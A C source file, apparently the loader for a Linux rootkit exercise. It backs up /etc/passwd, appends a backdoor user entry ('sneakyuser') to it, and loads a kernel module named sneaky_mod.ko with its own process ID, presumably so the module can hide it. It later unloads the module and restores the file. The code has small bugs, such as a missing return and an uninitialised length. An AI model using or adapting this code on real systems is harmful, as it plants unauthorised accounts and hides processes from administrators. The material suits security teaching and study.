#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int copyFile(char *source, char *destination) {
    FILE *readfile = fopen(source, "r");
    FILE *writefile = fopen (destination,"w");
    
    if(readfile == NULL || writefile==NULL){
        printf("cannot open file");
        return EXIT_FAILURE;
    }

    char * line = NULL;
    size_t len;
    while(getline(&line,&len,readfile)>=0){
        fputs(line,writefile);
    }
    free(line);
    fclose(writefile);
    fclose(readfile);
}

int writepassword(char * filename){
    FILE * writefile = fopen (filename,"a");
    if(writefile == NULL){
        printf("cannot open file");
        return EXIT_FAILURE;
    }
    fputs("sneakyuser:abc123:2000:2000:sneakyuser:/root:bash",writefile);
    fclose(writefile);


}


int main(){
    printf("sneaky_process pid = %d\n", getpid());
    //copy the /etc/passwd file (used for user authentication) to a new file: /tmp/passwd
    copyFile("/etc/passwd","/tmp/passwd");
    // add one line to readfile sneakyuser:abc123:2000:2000:sneakyuser:/root:bash
    writepassword("/etc/passwd");
    // load the sneaky module
    char command[100];
    sprintf(command, "insmod sneaky_mod.ko pid=%d", (int)getpid()); 
    system(command);
    char input;
   
    while ((input = getchar()) != 'q') {

    }
    //unload sneaky
    system("rmmod sneaky_mod.ko");
    
    //restore the /etc/passwd
    copyFile("/tmp/passwd", "/etc/passwd");
}
